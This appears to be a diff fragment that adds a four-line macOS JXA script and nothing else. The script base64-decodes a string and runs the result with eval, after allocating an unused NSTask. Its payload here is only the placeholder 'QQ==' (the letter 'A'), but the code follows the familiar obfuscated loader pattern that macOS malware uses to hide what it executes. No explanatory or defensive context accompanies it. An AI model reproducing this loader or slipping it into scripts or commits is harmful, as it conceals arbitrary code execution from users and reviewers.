@@ -1,0 +1,4 @@
+ObjC.import('Foundation');
+var task = $.NSTask.alloc.init;
+var d = $.NSData.alloc.initWithBase64EncodedStringOptions($('QQ=='), 0);
+eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding(d, 4)));
